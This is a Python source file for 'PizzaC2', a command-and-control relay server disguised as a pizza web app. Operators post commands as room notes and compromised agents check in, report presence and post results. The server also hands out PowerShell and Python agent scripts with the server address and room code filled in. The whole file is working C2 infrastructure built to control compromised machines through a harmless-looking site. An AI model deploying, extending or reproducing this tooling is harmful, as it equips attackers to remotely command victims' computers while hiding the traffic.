#!/usr/bin/env python3
"""
PizzaC2 - LOTS (Living Off Trusted Sites) C2 Relay Server
Python 3 Standard Library Implementation (Zero pip dependencies)
"""

import http.server
import json
import os
import re
import sys
import time
import urllib.parse
from http import HTTPStatus

PORT = 8080
HOST = "0.0.0.0"

# In-Memory Storage
ROOMS = {}
ROOM_NOTES = {}
ROOM_NOTE_COUNTS = {}
ROOM_PRESENCE = {}

BASE_DIR = os.path.dirname(os.path.abspath(__file__))


def clean_expired_presence():
    now = int(time.time() * 1000)
    for code, presence_dict in list(ROOM_PRESENCE.items()):
        for uid in list(presence_dict.keys()):
            if now - presence_dict[uid].get("lastSeen", 0) > 15000:
                del presence_dict[uid]


class PizzaC2Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=BASE_DIR, **kwargs)

    def log_message(self, format, *args):
        # Clean terminal logging
        pass

    def send_cors_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")

    def do_OPTIONS(self):
        self.send_response(HTTPStatus.NO_CONTENT)
        self.send_cors_headers()
        self.end_headers()

    def send_json(self, data, status_code=200):
        body = json.dumps(data).encode("utf-8")
        self.send_response(status_code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_cors_headers()
        self.end_headers()
        self.wfile.write(body)

    def send_text(self, text, content_type="text/plain; charset=utf-8", status_code=200):
        body = text.encode("utf-8")
        self.send_response(status_code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_cors_headers()
        self.end_headers()
        self.wfile.write(body)

    def read_json_body(self):
        content_length = int(self.headers.get("Content-Length", 0))
        if content_length == 0:
            return {}
        raw = self.rfile.read(content_length).decode("utf-8")
        try:
            return json.loads(raw)
        except Exception:
            return {}

    def do_GET(self):
        clean_expired_presence()
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)

        # C2 API Router
        if path.startswith("/api/"):
            if path == "/api/status":
                self.send_json({
                    "status": "ok",
                    "mode": "pizzac2",
                    "timestamp": int(time.time() * 1000),
                    "activeRooms": len(ROOMS)
                })
                return

            if path == "/api/rooms":
                self.send_json({"rooms": list(ROOMS.values())})
                return

            room_match = re.match(r"^/api/rooms/(\d{6})(/.*)?$", path)
            if room_match:
                code = room_match.group(1)
                sub = room_match.group(2) or ""

                if code not in ROOMS:
                    ROOMS[code] = {
                        "code": code,
                        "adminCode": "",
                        "host": "Host",
                        "createdAt": int(time.time() * 1000),
                        "active": True
                    }
                    ROOM_NOTES[code] = []
                    ROOM_NOTE_COUNTS[code] = 0
                    ROOM_PRESENCE[code] = {}

                if sub in ("", "/"):
                    self.send_json({"exists": True, "room": ROOMS[code]})
                    return

                if sub == "/notes":
                    self.send_json({"notes": ROOM_NOTES.get(code, [])})
                    return

                if sub == "/presence":
                    self.send_json({"presence": list(ROOM_PRESENCE.get(code, {}).values())})
                    return

            if path == "/api/agent/ps1":
                code = query.get("code", ["123456"])[0]
                server = query.get("server", [f"http://127.0.0.1:{PORT}"])[0]
                agent_path = os.path.join(BASE_DIR, "agent.ps1")
                if os.path.exists(agent_path):
                    with open(agent_path, "r", encoding="utf-8") as f:
                        content = f.read()
                    content = re.sub(r'(\$ServerUrl\s*=\s*")[^"]*(")', rf'\g<1>{server}\g<2>', content)
                    content = re.sub(r'(\$RoomCode\s*=\s*")[^"]*(")', rf'\g<1>{code}\g<2>', content)
                    self.send_text(content)
                else:
                    self.send_text("# agent.ps1 not found", status_code=404)
                return

            if path == "/api/agent/py":
                code = query.get("code", ["123456"])[0]
                server = query.get("server", [f"http://127.0.0.1:{PORT}"])[0]
                agent_path = os.path.join(BASE_DIR, "agent.py")
                if os.path.exists(agent_path):
                    with open(agent_path, "r", encoding="utf-8") as f:
                        content = f.read()
                    content = re.sub(r'(SERVER_URL\s*=\s*")[^"]*(")', rf'\g<1>{server}\g<2>', content)
                    content = re.sub(r'(ROOM_CODE\s*=\s*")[^"]*(")', rf'\g<1>{code}\g<2>', content)
                    self.send_text(content)
                else:
                    self.send_text("# agent.py not found", status_code=404)
                return

            self.send_json({"error": "Unknown API endpoint"}, status_code=404)
            return

        # Serve static file
        if path == "/":
            self.path = "/index.html"
        return super().do_GET()

    def do_POST(self):
        clean_expired_presence()
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        if path == "/api/rooms":
            body = self.read_json_body()
            code = str(body.get("code", "")).strip()
            if code:
                ROOMS[code] = {
                    "code": code,
                    "adminCode": str(body.get("adminCode", "")),
                    "host": str(body.get("host", "Host")),
                    "createdAt": int(time.time() * 1000),
                    "active": True
                }
                ROOM_NOTES.setdefault(code, [])
                ROOM_NOTE_COUNTS.setdefault(code, 0)
                ROOM_PRESENCE.setdefault(code, {})
                print(f"[+] [Room Created] Code: {code}")
                self.send_json({"success": True, "room": ROOMS[code]})
            else:
                self.send_json({"error": "Code required"}, status_code=400)
            return

        room_match = re.match(r"^/api/rooms/(\d{6})(/.*)?$", path)
        if room_match:
            code = room_match.group(1)
            sub = room_match.group(2) or ""

            ROOMS.setdefault(code, {
                "code": code,
                "adminCode": "",
                "host": "Host",
                "createdAt": int(time.time() * 1000),
                "active": True
            })
            ROOM_NOTES.setdefault(code, [])
            ROOM_NOTE_COUNTS.setdefault(code, 0)
            ROOM_PRESENCE.setdefault(code, {})

            if sub == "/notes":
                body = self.read_json_body()
                text = str(body.get("text", "")).strip()
                if text:
                    ROOM_NOTE_COUNTS[code] += 1
                    num = ROOM_NOTE_COUNTS[code]
                    author = str(body.get("author", "Anonymous"))
                    note_id = str(body.get("id")) if body.get("id") else f"{code}-{num}-{int(time.time()*1000)}"
                    is_cmd = text.startswith("!") or text.startswith("[CMD]")
                    is_res = text.startswith("[RES]") or text.startswith("[OUTPUT]")

                    note_obj = {
                        "id": note_id,
                        "number": num,
                        "author": author,
                        "text": text,
                        "timestamp": int(time.time() * 1000),
                        "isCommand": is_cmd,
                        "isResponse": is_res
                    }
                    ROOM_NOTES[code].append(note_obj)

                    if is_cmd:
                        print(f"\033[95m[!] [C2 COMMAND POSTED] Room: {code} | {author}: {text}\033[0m")
                    elif is_res:
                        print(f"\033[96m[*] [C2 AGENT RESPONSE] Room: {code} | {author} responded!\033[0m")
                    else:
                        print(f"[i] [Note Posted] Room: {code} | #{num} by {author}")

                    self.send_json({"success": True, "note": note_obj})
                else:
                    self.send_json({"error": "Empty text"}, status_code=400)
                return

            if sub == "/presence":
                body = self.read_json_body()
                uid = str(body.get("id", ""))
                if uid:
                    name = str(body.get("name", "Guest"))
                    is_agent = bool(body.get("isAgent", False))
                    is_host = bool(body.get("isHost", False))

                    if uid not in ROOM_PRESENCE[code] and is_agent:
                        print(f"\033[93m[+] [NEW AGENT CHECK-IN] Room: {code} | {name} ({uid})\033[0m")

                    ROOM_PRESENCE[code][uid] = {
                        "id": uid,
                        "code": code,
                        "name": name,
                        "isHost": is_host,
                        "isAgent": is_agent,
                        "lastSeen": int(time.time() * 1000)
                    }
                    self.send_json({"success": True})
                else:
                    self.send_json({"error": "ID required"}, status_code=400)
                return

        self.send_json({"error": "Endpoint not found"}, status_code=404)

    def do_DELETE(self):
        clean_expired_presence()
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        room_match = re.match(r"^/api/rooms/(\d{6})(/.*)?$", path)
        if room_match:
            code = room_match.group(1)
            sub = room_match.group(2) or ""

            if sub in ("", "/"):
                ROOMS.pop(code, None)
                ROOM_NOTES.pop(code, None)
                ROOM_NOTE_COUNTS.pop(code, None)
                ROOM_PRESENCE.pop(code, None)
                print(f"[-] [Room Deleted] Code: {code}")
                self.send_json({"success": True})
                return

            note_del_match = re.match(r"^/notes/(.+)$", sub)
            if note_del_match:
                target_id = note_del_match.group(1)
                notes = ROOM_NOTES.get(code, [])
                ROOM_NOTES[code] = [n for n in notes if n.get("id") != target_id]
                self.send_json({"success": True})
                return

        self.send_json({"error": "Endpoint not found"}, status_code=404)


if __name__ == "__main__":
    banner = f"""
===================================================================
  ____  _                 ____ ____  
 |  _ \(_)___________ _  / ___|___ \ 
 | |_) | |_  /_  / _` | | |     __) |
 |  __/| |/ / / / (_| | | |___ / __/ 
 |_|   |_/___/___\__,_|  \____|_____|
  LOTS (Living Off Trusted Sites) C2 Server (Python)
===================================================================
[*] Serving Pizza Web App & C2 Relay
[*] URL: http://127.0.0.1:{PORT}/
[*] Press Ctrl+C to stop
===================================================================
"""
    print(banner)
    server = http.server.ThreadingHTTPServer((HOST, PORT), PizzaC2Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server shutting down...")
        server.server_close()
